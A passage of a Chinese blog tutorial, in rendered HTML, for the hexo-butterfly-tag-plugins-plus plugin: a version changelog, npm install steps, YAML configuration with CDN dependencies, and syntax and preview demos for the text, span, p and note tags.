class="meta"><p><p>2020-11-15:正式版v1.0</p></p></div><div class="body"><ol><li>基本完成Volantis外挂标签移植。</li><li>移除了btn标签，因为存在冲突。而且不如butterfly自带的button样式好看。</li><li>适配了folding标签的夜间模式。</li><li>打包了静态资源文件，上传蓝奏云。</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2020-11-16:正式版v1.1</p></p></div><div class="body"><ol><li>新增tip.js，将小康大佬的渐变色上标标签写法从HTML的方式改成用标签语法编写。</li><li>新增动态标签样式anima，使用了fontawesome-animation项目。</li><li>新增标签内容夜间模式适配。</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2020-12-03:正式版v1.2</p></p></div><div class="body"><ol><li>新增当初弃用的issues.js标签，以配合友链魔改教程中的issues自动更新功能。</li><li>更新了静态资源文件，请之前的读者重新覆盖安装。</li><li>修改了<code>fontawesome-animation.min.css</code>的引入方式，改成使用<code>@import</code>注入<code>index.css</code>。</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2020-12-07:正式版v1.21</p></p></div><div class="body"><ol><li>资源文件无任何改动。</li><li>更新了动态标签的使用说明。补全参数配置，更换示例。使得教程更加通俗易懂。</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2020-12-13:正式版v1.3</p></p></div><div class="body"><ol><li>新增Butterfly_v3.4.0的配置文件。</li><li>请读者根据自己的主题版本选择替换。</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2020-12-17:正式版v1.4</p></p></div><div class="body"><ol><li>新增两个样式标签poem和icon</li><li>修复了folding标签嵌套字体逐级放大的bug。</li><li>不再更新v3.4.0以下版本的适配内容。</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2020-12-31:正式版v1.5</p></p></div><div class="body"><ol><li>新增两个样式标签，github徽标ghbdage和特效标签wow</li><li>移除静态资源中的<code>fontawesome-animation.min.css</code>以及<code>issues.js</code>，改为CDN引用。</li><li>本帖不专门提供特效标签wow的配置方案，若有需要，请查看相关教程<a href="https://akilar.top/posts/abab51cf/">使用wowjs给博客添加动画效果</a></li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-02-24:正式版v1.6</p></p></div><div class="body"><ol><li>新增一个样式标签，进度条progress</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-03-19:正式版v1.61</p></p></div><div class="body"><ol><li>修复行内图片换行错误。</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-07-07:发布插件版v1.0.0</p></p></div><div class="body"><ol><li>使用npm插件安装。</li><li>测试版本为butterfly_v3.1.0、3.3.0、3.7.8、3.8.0</li><li>插件写法调整为高内聚，理论上不受butterfly主题版本影响。</li><li>为了获得完整效果，建议打开主题的beautify配置项和theme_color配置项。</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-08-06:发布插件版v1.0.3</p></p></div><div class="body"><ol><li>新增<code>carousel</code>旋转相册</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-12-01:发布插件版v1.0.4</p></p></div><div class="body"><ol><li>调整<code>tip</code>标签，字体垂直居中</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-12-07:发布插件版v1.0.5</p></p></div><div class="body"><ol><li>调整<code>folding</code>标签，解决与twikoo设置面板样式的冲突问题</li><li>因为调整了<code>folding</code>标签的编译函数，低版本会出现folding样式失效的情况，请各位更新至最新版本。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-butterfly-tag-plugins-plus@1.0.5 --save</span><br></pre></td></tr></table></figure></li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-12-09:发布插件版v1.0.9</p></p></div><div class="body"><ol><li>调整<code>link</code>标签的默认图片缺省值适配，新增<code>tag_plugins.link.placeholder</code>配置项。</li><li>因为新增了默认图片，新增配置项，所以需要更新版本。如果本身使用link标签就有自己加图片的习惯的，无需升级。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-butterfly-tag-plugins-plus@1.0.9 --save</span><br></pre></td></tr></table></figure></li></ol></div></div></div>              </div>            </details><div class="tabs" id="配置方案"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#配置方案-1">npm插件安装方案（推荐）</button></li><li class="tab"><button type="button" data-href="#配置方案-2">源码修改配置方案</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="配置方案-1"><ol><li>安装插件,在博客根目录<code>[Blogroot]</code>下打开终端，运行以下指令：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-butterfly-tag-plugins-plus --save</span><br></pre></td></tr></table></figure>考虑到hexo自带的markdown渲染插件<code>hexo-renderer-marked</code>与外挂标签语法的兼容性较差，建议您将其替换成<a href="https://www.npmjs.com/package/hexo-renderer-kramed">hexo-renderer-kramed</a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></li><li>添加配置信息，以下为写法示例<br> 在站点配置文件<code>_config.yml</code>或者主题配置文件<code>_config.butterfly.yml</code>中添加<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tag-plugins-plus</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/615e2dec/</span></span><br><span class="line"><span class="attr">tag_plugins:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">5</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">issues:</span> <span class="literal">false</span> <span class="comment">#issues标签依赖注入开关</span></span><br><span class="line">  <span class="attr">link:</span></span><br><span class="line">    <span class="attr">placeholder:</span> <span class="string">/img/link.png</span> <span class="comment">#link_card标签默认的图标图片</span></span><br><span class="line">  <span class="attr">CDN:</span></span><br><span class="line">    <span class="attr">anima:</span> <span class="string">https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css</span> <span class="comment">#动画标签anima的依赖</span></span><br><span class="line">    <span class="attr">jquery:</span> <span class="string">https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js</span> <span class="comment">#issues标签依赖</span></span><br><span class="line">    <span class="attr">issues:</span> <span class="string">https://cdn.jsdelivr.net/npm/hexo-theme-volantis@latest/source/js/issues.min.js</span> <span class="comment">#issues标签依赖</span></span><br><span class="line">    <span class="attr">iconfont:</span> <span class="string">//at.alicdn.com/t/font_2032782_8d5kxvn09md.js</span> <span class="comment">#参看https://akilar.top/posts/d2ebecef/</span></span><br><span class="line">    <span class="attr">carousel:</span> <span class="string">https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js</span></span><br></pre></td></tr></table></figure></li><li>参数释义</li></ol><div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">备选值/类型</th><th style="text-align:left">释义</th></tr></thead><tbody><tr><td style="text-align:left">enable</td><td style="text-align:left">true/false</td><td style="text-align:left">【必选】控制开关</td></tr><tr><td style="text-align:left">priority</td><td style="text-align:left">number</td><td style="text-align:left">【可选】过滤器优先级，数值越小，执行越早，默认为10，选填</td></tr><tr><td style="text-align:left">issues</td><td style="text-align:left">true/false</td><td style="text-align:left">【可选】issues标签控制开关，默认为false</td></tr><tr><td style="text-align:left">link.placeholder</td><td style="text-align:left">【必选】link卡片外挂标签的默认图标</td></tr><tr><td style="text-align:left">CDN.anima</td><td style="text-align:left">URL</td><td style="text-align:left">【可选】动画标签anima的依赖</td></tr><tr><td style="text-align:left">CDN.jquery</td><td style="text-align:left">URL</td><td style="text-align:left">【可选】issues标签依赖</td></tr><tr><td style="text-align:left">CDN.issues</td><td style="text-align:left">URL</td><td style="text-align:left">【可选】issues标签依赖</td></tr><tr><td style="text-align:left">CDN.iconfont</td><td style="text-align:left">URL</td><td style="text-align:left">【可选】iconfont标签symbol样式引入</td></tr><tr><td style="text-align:left">CDN.carousel</td><td style="text-align:left">URL</td><td style="text-align:left">【可选】carousel旋转相册标签鼠标拖动依赖</td></tr></tbody></table></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="配置方案-2"><ol><li>下载资源文件<br><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/Akilarlxh/Tag_Plugins"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=Akilarlxh&repo=Tag_Plugins&theme=vue&show_owner=true"/></a></li><li>将下载的<code>Tag_Plugins.zip</code>解压得到<code>butterfly</code>文件夹。</li><li>将<code>butterfly</code>文件夹复制到<code>[Blogroot]\themes\</code>目录下，覆盖当前的<code>butterfly</code>主题文件夹，提示重复则选择替换。(如果担心覆盖自己的其他魔改内容，可以根据静态文件内容自主比对修改)</li><li>修改<code>[Blogroot]\_config.butterfly.yml</code>的<code>inject</code>配置项，添加<code>CDN</code>依赖项。由于<code>issues</code>写入<code>timeline</code>和<code>site-card</code>标签要用到<code>jquery</code>，请务必根据注释指示的版本决定是否添加。<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css&quot;</span>  <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span>  <span class="comment">#动画标签anima的依赖</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">async</span> <span class="string">src=&quot;https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js&quot;&gt;&lt;/script&gt;</span> <span class="comment">#carousel相册鼠标动作的依赖</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">src=&quot;https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># 自butterfly_v3.4.0+开始，主题基本实现去jquery化，需要自己添加引用，请读者根据版本自行决定是否添加这行引用。</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">src=&quot;https://cdn.jsdelivr.net/npm/hexo-theme-volantis@latest/source/js/issues.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment">#数据集合标签issues的依赖</span></span><br></pre></td></tr></table></figure></li><li>考虑到hexo自带的markdown渲染插件<code>hexo-renderer-marked</code>与外挂标签语法的兼容性较差，建议您将其替换成<a href="https://www.npmjs.com/package/hexo-renderer-kramed">hexo-renderer-kramed</a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></li><li>外挂标签使用方案请参阅下文。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="行内文本样式-text"><a href="#行内文本样式-text" class="headerlink" title="行内文本样式 text"></a>行内文本样式 text</h1><div class="tabs" id="text"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#text-1">标签语法</button></li><li class="tab active"><button type="button" data-href="#text-2">样式预览</button></li><li class="tab"><button type="button" data-href="#text-3">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="text-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% u 文本内容 %&#125;</span><br><span class="line">&#123;% emp 文本内容 %&#125;</span><br><span class="line">&#123;% wavy 文本内容 %&#125;</span><br><span class="line">&#123;% del 文本内容 %&#125;</span><br><span class="line">&#123;% kbd 文本内容 %&#125;</span><br><span class="line">&#123;% psw 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="text-2"><ol><li>带 <u>下划线</u> 的文本</li><li>带 <emp>着重号</emp> 的文本</li><li>带 <wavy>波浪线</wavy> 的文本</li><li>带 <del>删除线</del> 的文本</li><li>键盘样式的文本 <kbd>command</kbd> + <kbd>D</kbd></li><li>密码样式的文本：<psw>这里没有验证码</psw></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="text-3"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> 带 &#123;% u 下划线 %&#125; 的文本</span><br><span class="line"><span class="bullet">2.</span> 带 &#123;% emp 着重号 %&#125; 的文本</span><br><span class="line"><span class="bullet">3.</span> 带 &#123;% wavy 波浪线 %&#125; 的文本</span><br><span class="line"><span class="bullet">4.</span> 带 &#123;% del 删除线 %&#125; 的文本</span><br><span class="line"><span class="bullet">5.</span> 键盘样式的文本 &#123;% kbd command %&#125; + &#123;% kbd D %&#125;</span><br><span class="line"><span class="bullet">6.</span> 密码样式的文本：&#123;% psw 这里没有验证码 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="行内文本-span"><a href="#行内文本-span" class="headerlink" title="行内文本 span"></a>行内文本 span</h1><div class="tabs" id="span"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#span-1">标签语法</button></li><li class="tab"><button type="button" data-href="#span-2">配置参数</button></li><li class="tab active"><button type="button" data-href="#span-3">样式预览</button></li><li class="tab"><button type="button" data-href="#span-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="span-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% span 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="span-2"><ol><li>字体: logo, code</li><li>颜色: <span class='p red'>red</span>,<span class='p yellow'>yellow</span>,<span class='p green'>green</span>,<span class='p cyan'>cyan</span>,<span class='p blue'>blue</span>,<span class='p gray'>gray</span></li><li>大小: small, h4, h3, h2, h1, large, huge, ultra</li><li>对齐方向: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="span-3"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<span class='p red'>红色</span>、<span class='p yellow'>黄色</span>、<span class='p green'>绿色</span>、<span class='p cyan'>青色</span>、<span class='p blue'>蓝色</span>、<span class='p gray'>灰色</span>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。<br><span class='p center logo large'>Volantis</span><br><span class='p center small'>A Wonderful Theme for Hexo</span></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="span-4"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% span red, 红色 %&#125;、&#123;% span yellow, 黄色 %&#125;、&#123;% span green, 绿色 %&#125;、&#123;% span cyan, 青色 %&#125;、&#123;% span blue, 蓝色 %&#125;、&#123;% span gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% span center logo large, Volantis %&#125;</span><br><span class="line">&#123;% span center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="段落文本-p"><a href="#段落文本-p" class="headerlink" title="段落文本 p"></a>段落文本 p</h1><div class="tabs" id="p"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#p-1">标签语法</button></li><li class="tab"><button type="button" data-href="#p-2">配置参数</button></li><li class="tab active"><button type="button" data-href="#p-3">样式预览</button></li><li class="tab"><button type="button" data-href="#p-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="p-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% p 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="p-2"><ol><li>字体: logo, code</li><li>颜色: <span class='p red'>red</span>,<span class='p yellow'>yellow</span>,<span class='p green'>green</span>,<span class='p cyan'>cyan</span>,<span class='p blue'>blue</span>,<span class='p gray'>gray</span></li><li>大小: small, h4, h3, h2, h1, large, huge, ultra</li><li>对齐方向: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="p-3"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<p class='p red'>红色</p>、<p class='p yellow'>黄色</p>、<p class='p green'>绿色</p>、<p class='p cyan'>青色</p>、<p class='p blue'>蓝色</p>、<p class='p gray'>灰色</p>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。<p class='p center logo large'>Volantis</p><p class='p center small'>A Wonderful Theme for Hexo</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="p-4"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% p red, 红色 %&#125;、&#123;% p yellow, 黄色 %&#125;、&#123;% p green, 绿色 %&#125;、&#123;% p cyan, 青色 %&#125;、&#123;% p blue, 蓝色 %&#125;、&#123;% p gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% p center logo large, Volantis %&#125;</span><br><span class="line">&#123;% p center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="引用-note"><a href="#引用-note" class="headerlink" title="引用 note"></a>引用 note</h1><div class="note warning flat"><p>最新版<code>butterfly</code>标签支持引用<code>fontawesome V5</code>图标，效果上已经优于<code>volantis</code>的note标签。故不再额外引入<code>volantis的note样式</code>。<del>做样式适配好麻烦的啊，能偷懒就偷懒吧</del></p></div><div class="note blue icon modern"><i class="note-icon fas fa-bullhorn"></i><p>以下是<code>butterfly</code>主题的note写法。</p></div><div class="tabs" id="note"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#note-1">通用配置</button></li><li class="tab"><button type="button" data-href="#note-2">语法格式</button></li><li class="tab"><button type="button" data-href="#note-3">配置参数</button></li><li class="tab active"><button type="button" data-href="#note-4">样式预览</button></li><li class="tab"><button type="button" data-href="#note-5">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="note-1"><p>修改主题配置文件<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">note:</span></span><br><span class="line">  <span class="comment"># Note tag style values:</span></span><br><span class="line">  <span class="comment">#  - simple    bs-callout old alert style. Default.</span></span><br><span class="line">  <span class="comment">#  - modern    bs-callout new (v2-v3) alert style.</span></span><br><span class="line">  <span class="comment">#  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span></span><br><span class="line">  <span class="comment">#  - disabled  disable all CSS styles import of note tag.</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">simple</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">border_radius:</span> <span class="number">3</span></span><br><span class="line">  <span class="comment"># Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span></span><br><span class="line">  <span class="comment"># Offset also applied to label tag variables. This option can work with disabled note tag.</span></span><br><span class="line">  <span class="attr">light_bg_offset:</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><br><code>Note</code>标签外挂有两种用法。<code>icons</code>和<code>light_bg_offset</code>只对方法一生效。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="note-2"><details class="folding-tag" cyan><summary> 方法一 </summary>              <div class='content'>              <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note [class] [no-icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" blue><summary> 方法二 </summary>              <div class='content'>              <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note [color] [icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="note-3"><details class="folding-tag" cyan><summary> 方法一 </summary>              <div class='content'>              <div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">用法</th></tr></thead><tbody><tr><td style="text-align:left">class</td><td style="text-align:left">【可选】标识，不同的标识有不同的配色<br>（ default / primary / success / info / warning / danger ）</td></tr><tr><td style="text-align:left">no-icon</td><td style="text-align:left">【可选】不显示 icon</td></tr><tr><td style="text-align:left">style</td><td style="text-align:left">【可选】可以覆盖配置中的 style<br>（simple/modern/flat/disabled）</td></tr></tbody></table></div>              </div>            </details><details class="folding-tag" blue><summary> 方法二 </summary>              <div class='content'>              <div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">用法</th></tr></thead><tbody><tr><td style="text-align:left">class</td><td style="text-align:left">【可选】标识，不同的标识有不同的配色<br>（ default / blue / pink / red / purple / orange / green ）</td></tr><tr><td style="text-align:left">no-icon</td><td style="text-align:left">【可选】可配置自定义 icon (只支持 fontawesome 图标, 也可以配置 no-icon )</td></tr><tr><td style="text-align:left">style</td><td style="text-align:left">【可选】可以覆盖配置中的 style<br>（simple/modern/flat/disabled）</td></tr></tbody></table></div>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="note-4"><details class="folding-tag" cyan><summary> 方法一 </summary>              <div class='content'>              <ol><li><p><code>simple</code>样式</p><div class="note simple"><p>默认 提示块标签</p></div><div class="note default simple"><p>default 提示块标签</p></div><div class="note primary simple"><p>primary 提示块标签</p></div><div class="note success simple"><p>success 提示块标签</p></div><div class="note info simple"><p>info 提示块标签</p></div><div class="note warning simple"><p>warning 提示块标签</p></div><div class="note danger simple"><p>danger 提示块标签</p></div></li><li><p><code>modern</code>样式</p><div class="note modern"><p>默认 提示块标签</p></div><div class="note default modern"><p>default 提示块标签</p></div><div class="note primary modern"><p>primary 提示块标签</p></div><div class="note success modern"><p>success 提示块标签</p></div><div class="note info modern"><p>info 提示块标签</p></div><div class="note warning modern"><p>warning 提示块标签</p></div><div class="note danger modern"><p>danger 提示块标签</p></div></li><li><p><code>flat</code>样式</p><div class="note flat"><p>默认 提示块标签</p></div><div class="note default flat"><p>default 提示块标签</p></div><div class="note primary flat"><p>primary 提示块标签</p></div><div class="note success flat"><p>success 提示块标签</p></div><div class="note info flat"><p>info 提示块标签</p></div><div class="note warning flat"><p>warning 提示块标签</p></div><div class="note danger flat"><p>danger 提示块标签</p></div></li><li><p><code>disabled</code>样式</p><div class="note disabled"><p>默认 提示块标签</p></div><div class="note default disabled"><p>default 提示块标签</p></div><div class="note primary disabled"><p>primary 提示块标签</p></div><div class="note success disabled"><p>success 提示块标签</p></div><div class="note info disabled"><p>info 提示块标签</p></div><div class="note warning disabled"><p>warning 提示块标签</p></div><div class="note danger disabled"><p>danger 提示块标签</p></div></li><li><p><code>no-icon</code>样式</p><div class="note no-icon flat"><p>默认 提示块标签</p></div><div class="note default no-icon flat"><p>default 提示块标签</p></div><div class="note primary no-icon flat"><p>primary 提示块标签</p></div><div class="note success no-icon flat"><p>success 提示块标签</p></div><div class="note info no-icon flat"><p>info 提示块标签</p></div><div class="note warning no-icon flat"><p>warning 提示块标签</p></div><div class="note danger no-icon flat"><p>danger 提示块标签</p></div></li></ol>              </div>            </details><details class="folding-tag" blue><summary> 方法二 </summary>              <div class='content'>              <ol><li><p>simple样式</p><div class="note icon simple"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon simple"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了….</p></div><div class="note pink icon simple"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon simple"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon simple"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div></li><li><p>modern样式</p><div class="note icon modern"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon modern"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了….</p></div><div class="note pink icon modern"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon modern"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon modern"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon modern"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div></li><li><p>flat样式</p><div class="note icon flat"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了….</p></div><div class="note pink icon flat"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon flat"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon flat"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon flat"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div></li></ol><ol><li><p>disabled样式</p><div class="note icon disabled"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon disabled"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了….</p></div><div class="note pink icon disabled"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon disabled"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon disabled"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon disabled"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon disabled"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div></li><li><p>no-icon样式</p><div class="note no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue no-icon flat"><p>2021年快到了….</p></div><div class="note pink no-icon flat"><p>小心开车 安全至上</p></div><div class="note red no-icon flat"><p>这是三片呢？还是四片？</p></div><div class="note orange no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple no-icon flat"><p>剪刀石头布</p></div><div class="note green no-icon flat"><p>前端最讨厌的浏览器</p></div></li></ol>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="note-5"><details class="folding-tag" cyan><summary> 方法一 </summary>              <div class='content'>              <ol><li><p><code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note simple %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default simple %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary simple %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success simple %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info simple %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning simple %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger simple %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note modern %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default modern %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary modern %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success modern %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info modern 